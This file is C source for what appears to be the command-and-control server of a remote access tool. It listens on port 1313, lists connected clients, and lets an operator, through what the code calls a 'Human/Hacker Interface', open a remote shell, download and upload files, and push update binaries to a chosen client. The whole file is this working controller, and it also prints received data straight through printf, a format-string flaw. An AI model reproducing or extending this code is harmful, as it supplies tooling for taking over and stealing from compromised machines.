#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include "eaSCKTBasicComProtocols.h"

#ifndef LISTEN_PORT
#define LISTEN_PORT 1313
#endif

static fd_set clients;

#ifndef _WIN32
static EASCKT big_val;
#endif

/**
 * @brief 
 * 
 */
static void commWithSystems(void);

/**
 * @brief 
 * 
 * @param param 
 * @return void* 
 */
static void *threadHI(void *param);

/**
 * @brief 
 * 
 * @param sckt 
 * @return true 
 * @return false 
 */
static bool process(EASCKT sckt);

/**
 * @brief 
 * 
 * @param sckt 
 * @return true 
 * @return false 
 */
static bool recvSendText(EASCKT sckt);

int main(void)
{
    if (eaSCKTWSStart())
    {
        return EXIT_FAILURE;
    }

    commWithSystems();

    eaSCKTWSEnd();

    return 0;
}

static void commWithSystems(void)
{
    // Create TCP Socket

    EASCKT server = socket(AF_INET, SOCK_STREAM, 0);

    if (SCKT_ERR == server)
    {
        perror("socket");

        return;
    }

    // Fill "sockaddr_in" struct

    struct sockaddr_in myInfos = {
        .sin_family = AF_INET,
        .sin_port = htons(LISTEN_PORT),
        .sin_addr.s_addr = INADDR_ANY,
    };

    // Bind socket

    if (0 != bind(server, 
                  (struct sockaddr *)&myInfos, 
                  (EAScktLen){sizeof(myInfos)}))
    {
        perror("bind");
        eaSCKTClose(server);

        return;
    }

    // Listen config

    if (0 != listen(server, 10))
    {
        perror("listen");
        eaSCKTClose(server);

        return;
    }

    // Create Thread Clients For Human/Hacker Interface :D

    pthread_t th;

    (void)pthread_create(&th, NULL, threadHI, NULL);
    (void)pthread_detach(th);

	FD_ZERO(&clients);

    // For Clients

    for (;;)
    {
        struct sockaddr_in clientInfos;

        EASCKT newClient = accept(server, 
                                  (struct sockaddr *)&clientInfos, 
                                  &((EAScktLen){sizeof(clientInfos)}));

        if (SCKT_ERR == newClient)
        {
            break;
        }

        LOG("New Client %u!!!\n", (unsigned int)newClient);

	    FD_SET(newClient, &clients);

#ifndef _WIN32
        if (big_val < newClient)
        {
            big_val = newClient;
        }
#endif
    }

    eaSCKTClose(server);
}

static void *threadHI(void *param)
{
    (void)param;

    for (;;)
    {
        puts("Client List! Enter Client ID or 0 (0 for refresh)\n\n");

#ifndef _WIN32
        for (EASCKT client = 1; client <= big_val; client++)
        if (FD_ISSET(client, &clients))
        {
#else
        for (unsigned int idx = 0U; idx < clients.fd_count; idx++)
        {
            EASCKT client = clients.fd_array[idx];
#endif

            printf("Client ID : %u ", (unsigned int)client);
        }

        unsigned int inp;

        puts("");
        (void)scanf("%u", &inp);
        fflush(stdin); // :(
        puts("");

        if ((!inp) || !FD_ISSET((EASCKT)inp, &clients))
        {
            CLEAR_TERMINAL();

            continue;
        }

        bool ret = process((EASCKT)inp);

        CLEAR_TERMINAL();

        if (false == ret)
        {
            printf("Deleted Client! %u\n", inp);

            FD_CLR((EASCKT)inp, &clients);

            eaSCKTClose((EASCKT)inp);
        }
    }

    return NULL;
}

static bool process(EASCKT sckt)
{
    bool connection = true;
    char text[313 + 1] = {0};

    for (;;)
    {
        CLEAR_TERMINAL();

        puts("Command List");
        puts("\t-> cmd");
        puts("\t-> getFile <Path>");
        puts("\t-> sendFile <Path>");
        puts("\t-> update\n");
        puts("\t-> list\n");

        scanf("%313[^\n]", text);
        fflush(stdin); // :(

        if (!strncmp(text, "list", 4U))
        {
            break;
        }

        if (false == senderText(sckt, text))
        {
            connection = false;

            break;
        }

        if (!strncmp(text, "cmd", 3U))
        {
            if (false == recvSendText(sckt))
            {
                connection = false;

                break;
            }
        }
        else if (!strncmp(text, "getFile ", 8U))
        {
            if (false == recverFile(sckt))
            {
                connection = false;

                break;
            }
        }
        else if (!strncmp(text, "sendFile ", 9U))
        {
            if (false == senderFile(sckt, &text[9]))
            {
                connection = false;

                break;
            }
        }
        else if (!strncmp(text, "update ", 7U))
        {
            connection = false;

            (void)senderFile(sckt, &text[7]);
            
            break;
        }
    }

    return connection;
}

static bool recvSendText(EASCKT sckt)
{
    char ioStream[4500 + 1];
    bool connection = true;

    for (;;)
    {
        if (false == recverText(sckt, ioStream, sizeof(ioStream)))
        {
            connection = false;

            break;
        }

        if (!strncmp(ioStream, "_Error_", 7U))
        {
            printf("Error :%s\n", &ioStream[7]);

            connection = false;

            break;
        }

        (void)printf(ioStream);
        (void)fgets(ioStream, 4500, stdin);

        if (false == senderText(sckt, ioStream))
        {
            connection = false;

            break;
        }
        
        if (!strcmp(ioStream, "exit\n"))
        {
            break;
        }
    }

    return connection;
}
